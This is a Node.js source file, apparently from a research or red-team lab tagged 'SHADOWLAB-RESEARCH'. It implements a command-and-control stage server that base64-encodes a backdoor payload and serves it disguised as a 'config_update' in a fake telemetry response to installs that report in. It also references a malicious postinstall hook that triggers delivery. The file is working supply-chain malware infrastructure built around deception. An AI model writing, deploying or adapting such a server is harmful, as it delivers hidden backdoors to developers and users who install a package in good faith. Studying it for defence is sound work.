// c2-server/stage-server.js
// [SHADOWLAB-RESEARCH] Serves second-stage payload as a "config update" in a telemetry response

const https = require('https');
const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = parseInt(process.env.STAGE_PORT) || 8444;
const MAX_BODY_SIZE = 1024 * 64; // 64KB max request body

// Load the Tier 1 backdoor code and base64 encode it
const backdoorPath = path.join(__dirname, '..', 'malicious-repo', 'backdoor-payload.js');
let encodedPayload;
try {
  const backdoorCode = fs.readFileSync(backdoorPath, 'utf-8');
  encodedPayload = Buffer.from(backdoorCode).toString('base64');
  console.log(`[+] Loaded backdoor payload from ${backdoorPath}`);
} catch (e) {
  console.log('[!] backdoor-payload.js not found at:', backdoorPath);
  console.log('[!] To generate the payload, create malicious-repo/backdoor-payload.js');
  console.log('[!] or run the postinstall backdoor generator.');
  console.log('[!] Using placeholder payload for testing.');
  console.log('');
  const placeholder = [
    '// [SHADOWLAB-RESEARCH] Placeholder stage 2 payload',
    '// Replace with actual backdoor-payload.js for full Tier 3 testing',
    'console.log("[SHADOWLAB-RESEARCH] Stage 2 payload loaded — placeholder mode");',
    'console.log("[SHADOWLAB-RESEARCH] Generate real payload: see malicious-repo/scripts/postinstall.js");'
  ].join('\n');
  encodedPayload = Buffer.from(placeholder).toString('base64');
}

function handleRequest(req, res) {
  console.log(`[+] Stage request from ${req.socket.remoteAddress} — ${req.method} ${req.url}`);

  if (req.method === 'POST' && req.url === '/api/v1/telemetry') {
    let body = '';
    let bodySize = 0;

    req.on('data', (chunk) => {
      bodySize += chunk.length;
      if (bodySize > MAX_BODY_SIZE) {
        res.writeHead(413);
        res.end('Request too large');
        req.destroy();
        return;
      }
      body += chunk;
    });

    req.on('error', (e) => {
      console.log(`[!] Request error: ${e.message}`);
    });

    req.on('end', () => {
      console.log(`    Install event: ${body.substring(0, 200)}`);

      // Return the payload disguised as a config update response
      const response = JSON.stringify({
        status: 'ok',
        telemetry_id: 'tel_' + Date.now(),
        config_update: encodedPayload
      });

      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(response);
      console.log(`    Payload delivered (${encodedPayload.length} bytes encoded)`);
    });
  } else {
    res.writeHead(404);
    res.end('Not Found');
  }
}

// Try TLS, fall back to plain HTTP
const certPath = path.join(__dirname, 'certs', 'cert.pem');
const keyPath = path.join(__dirname, 'certs', 'key.pem');

if (fs.existsSync(certPath) && fs.existsSync(keyPath)) {
  try {
    const options = {
      key: fs.readFileSync(keyPath),
      cert: fs.readFileSync(certPath)
    };
    const server = https.createServer(options, handleRequest);
    server.listen(PORT, '0.0.0.0', () => {
      console.log(`[SHADOWLAB-RESEARCH] Stage server (HTTPS) listening on port ${PORT}`);
      console.log(`[SHADOWLAB-RESEARCH] Payload size: ${encodedPayload.length} bytes (base64)`);
    });
  } catch (e) {
    console.log(`[!] HTTPS stage server failed: ${e.message}`);
    console.log('[!] Falling back to plain HTTP');
    const server = http.createServer(handleRequest);
    server.listen(PORT, '0.0.0.0', () => {
      console.log(`[SHADOWLAB-RESEARCH] Stage server (HTTP) listening on port ${PORT}`);
      console.log(`[SHADOWLAB-RESEARCH] Payload size: ${encodedPayload.length} bytes (base64)`);
    });
  }
} else {
  console.log('[!] TLS certs not found — stage server using plain HTTP');
  const server = http.createServer(handleRequest);
  server.listen(PORT, '0.0.0.0', () => {
    console.log(`[SHADOWLAB-RESEARCH] Stage server (HTTP) listening on port ${PORT}`);
    console.log(`[SHADOWLAB-RESEARCH] Payload size: ${encodedPayload.length} bytes (base64)`);
  });
}
